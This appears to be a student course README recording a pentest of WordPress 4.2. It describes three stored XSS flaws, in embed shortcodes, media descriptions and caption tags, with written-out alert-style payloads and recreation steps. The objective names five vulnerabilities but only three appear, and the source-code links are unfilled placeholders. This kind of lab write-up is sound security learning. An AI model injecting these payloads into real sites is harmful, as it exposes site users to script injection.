
# Project 7 - WordPress Pentesting

Time spent: **3** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Embed YouTube link XXS
- [x] Summary: 
- Vulnerability types: XSS
- Tested in version: 4.2
- Fixed in version: 4.7.3
- [x] GIF Walkthrough: 
<img src="https://i.imgur.com/pueqPij.gif" width="800">
- [x] Steps to recreate: 
    1. Create or edit a new post
    2. Use the Text editor, not visual editor
    3. add an embeded link like this [embed src='https://www.youtube.com/embed/MEqjP3sn4bI\x3csvg <onload=alert("HACK")\x3e'][/embed]
- [ ] Affected source code:
- [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. Media file XXS
- [x] Summary: 
- Vulnerability types:XSS
- Tested in version: 4.2
- Fixed in version: 4.7.3
- [x] GIF Walkthrough: 
<img src="https://i.imgur.com/Q1XZtqI.gif" width="800">
- [x] Steps to recreate:
    1. Upload a new Media file
    2. Add a description containing XSS "Description <script>alert("HACK");</script>"
- [ ] Affected source code:
- [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. Tags XXS
- [x] Summary: 
- Vulnerability types: XSS
- Tested in version: 4.2
- Fixed in version: 4.3.1
- [x] GIF Walkthrough: 
<img src="https://i.imgur.com/kCaTJon.gif" width="800">
- [x] Steps to recreate: 
    1. add/edit a post
    2. add a tag similar to this [caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("HACK")' ">Button</a>
    3. When user clicks button, it is going to trigger the alert
- [ ] Affected source code:
- [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).


## License

Copyright [2018] [Tommy Tran]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
